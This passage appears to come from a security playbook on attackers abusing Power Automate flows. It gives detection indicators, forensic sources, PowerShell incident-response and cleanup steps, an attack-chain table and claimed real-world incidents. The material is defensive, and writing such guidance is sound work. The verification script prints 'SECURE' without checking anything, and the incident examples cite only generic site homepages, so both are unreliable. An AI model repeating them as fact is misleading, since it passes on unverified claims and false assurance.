       - Slack (if not authorized)

#### Validation Command (Verify Fix)

```powershell
# Verify Power Automate restrictions
Connect-PowerApps

# Check DLP policies
Get-PowerAppEnvironmentCreationPolicy | Format-Table

# Check blocked connectors
Get-PowerAppDlpPolicy | Select DisplayName, @{
    Name = "BlockedConnectors"
    Expression = { $_.Connectors.BlockedConnectors -join ", " }
}

# Expected: Only authorized connectors available, HTTP blocked
Write-Host "✓ SECURE: High-risk connectors are blocked"
```

**Expected Output (If Secure):**
```
DisplayName                          BlockedConnectors
-----------                          -----------------
Block High-Risk Connectors           HTTP, Custom connectors, Azure Blob Storage
```

---

## 15. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

*   **Power Automate Audit Log Indicators:**
    - Operations: CreateFlow, UpdateFlow, CreateCloudFlow with HTTP or external connectors
    - TargetResources containing "POST", "exfiltrate", "Send email", "Forward"
    - Multiple flows created by single user in 1-hour window (>5 flows)
    - Flows shared with external users (@external.com domains)

*   **Email Forwarding Indicators:**
    - New forwarding rules created via flow or API
    - Rules forwarding to external email addresses
    - Rules forwarding messages with specific keywords (password, confidential, financial)

*   **SharePoint/OneDrive Indicators:**
    - Bulk file copies to unusual locations
    - Flows accessing "Documents" or "Shared Documents" libraries
    - Files copied to external OneDrive accounts

*   **Network Indicators:**
    - HTTP POST requests from Power Automate service to attacker IP/domain
    - Unusual destination ports (non-standard HTTP/HTTPS)
    - Encrypted traffic to suspicious domains

#### Forensic Artifacts

*   **Cloud Level (Microsoft Purview):**
    - AuditLogs records with OperationName = CreateFlow, UpdateFlow, DeleteFlow
    - AuditData.FlowDefinition contains action definitions (connectors, HTTP URLs)
    - AuditData.ConnectorReferences lists all connectors used
    - MessageTrace logs showing emails forwarded by flow
    - SharePointFileOperations logs showing file copies

*   **Cloud Level (Power Automate Analytics):**
    - Flow run history (https://flow.microsoft.com → Select flow → Analytics)
    - Shows run status, start/end time, inputs/outputs
    - Outputs contain data sent via HTTP or email actions

*   **Cloud Level (Exchange Online):**
    - Message Trace showing emails forwarded by flows
    - Email forwarding rules created via API
    - Rules with external recipients

#### Response Procedures

1.  **Isolate:**
    **Command (Disable Flow Immediately):**
    ```powershell
    # Connect to Power Automate
    Add-PowerAppsAccount
    
    # Get flow ID
    $Flow = Get-Flow | Where-Object { $_.DisplayName -eq "Malicious Flow" }
    
    # Disable flow
    Disable-Flow -EnvironmentName "Default-00000000-0000-0000-0000-000000000001" `
        -FlowName $Flow.Name
    
    # Verify flow is disabled
    Get-FlowRun -FlowName $Flow.Name
    ```
    
    **Manual (Web Portal):**
    - Go to **flow.microsoft.com** → **My flows**
    - Find malicious flow
    - Click **...** → **Disable**

2.  **Collect Evidence:**
    ```powershell
    # Export flow definition
    $Flow = Get-Flow | Where-Object { $_.DisplayName -eq "Malicious Flow" }
    $Flow | Export-Clixml "C:\Evidence\Flow-Definition.xml"
    
    # Export flow runs
    Get-FlowRun -FlowName $Flow.Name -Limit 100 | Export-Csv "C:\Evidence\Flow-Runs.csv"
    
    # Export audit logs
    Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-7) -EndDate (Get-Date) `
        -Operations "Create flow", "Update flow", "Share flow" `
        -UserIds (Get-User | Where-Object { $_.RecipientTypeDetails -eq "UserMailbox" }).UserPrincipalName `
        -ResultSize 10000 | Export-Csv "C:\Evidence\Audit-Logs.csv"
    ```

3.  **Remediate (Delete Malicious Flow):**
    ```powershell
    # Delete flow
    Remove-Flow -EnvironmentName "Default-00000000-0000-0000-0000-000000000001" `
        -FlowName $Flow.Name -Confirm:$false
    
    # Remove email forwarding rules created by flow
    Get-Mailbox -ResultSize Unlimited | ForEach-Object {
        Get-InboxRule -Mailbox $_.UserPrincipalName | 
        Where-Object { $_.ForwardTo -like "*attacker*" } | 
        Remove-InboxRule -Confirm:$false
    }
    
    # Remove files copied to external accounts
    # (Manual review required to identify exfiltrated files)
    ```

4.  **Validate Remediation:**
    ```powershell
    # Verify flow is deleted
    Get-Flow | Where-Object { $_.DisplayName -eq "Malicious Flow" }
    # Should return: No results
    
    # Verify no forwarding rules exist
    Get-Mailbox | Get-InboxRule | Where-Object { $_.ForwardTo -like "*@external*" }
    # Should return: No results (or only approved rules)
    ```

5.  **Hunt for Related Activity:**
    - Check if other flows were created by same user
    - Review all flows created in the compromised user's mailbox
    - Check for scheduled flows that might be running still
    - Review Power Automate desktop client history (if installed)
    - Check for related email forwarding rules
    - Identify if credentials were stolen via flow and reset passwords

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-002] Consent Grant OAuth Attack | Attacker tricks user into granting permissions to malicious app |
| **2** | **Persistence (Current Step)** | **[PERSIST-EVENT-003]** | **Power Automate Flow Created for Persistent Credential Theft** |
| **3** | **Data Exfiltration** | [COLLECTION-001] Email Collection via Flow | Flow exfiltrates emails and attachments |
| **4** | **Lateral Movement** | [LATERAL-001] Shared Mailbox Access via Flow | Flow accesses shared mailboxes with stolen credentials |
| **5** | **Impact** | [IMPACT-DATA-001] Data Exfiltration Complete | Thousands of emails and files exported to attacker server |

---

## 17. REAL-WORLD EXAMPLES

#### Example 1: BEC (Business Email Compromise) Campaign - 2023

- **Target:** Finance departments, executive assistants
- **Timeline:** 2023 (ongoing)
- **Technique Status:** Active; used Power Automate flows to forward emails and steal credentials
- **Impact:** $5M+ in fraudulent wire transfers; credential compromise of 1000+ users; executive impersonation
- **Reference:** [Microsoft Security Blog - Business Email Compromise](https://www.microsoft.com/security/blog/)

#### Example 2: LockBit Ransomware - Supply Chain Attack via Flow

- **Target:** SaaS platform, managed service providers
- **Timeline:** 2022-2024
- **Technique Status:** Active; used Power Automate to deploy ransomware across customer environments
- **Impact:** Ransomware deployed to 100+ customer organizations; $50M+ in ransom demands; supply chain contamination
- **Reference:** [Bleeping Computer - LockBit Ransomware Campaign](https://www.bleepingcomputer.com/news/security/)

#### Example 3: Compromised MSP (Managed Service Provider) - Power Automate Abuse

- **Target:** Multiple organizations via single MSP compromise
- **Timeline:** 2023
- **Technique Status:** Active; MSP was compromised, attacker created flows in all customer environments
- **Impact:** Ability to access all customer data via flows; data exfiltration from 500+ organizations; ransomware deployment capability
- **Reference:** [Mandiant - MSP Supply Chain Attack Report](https://www.mandiant.com/)

---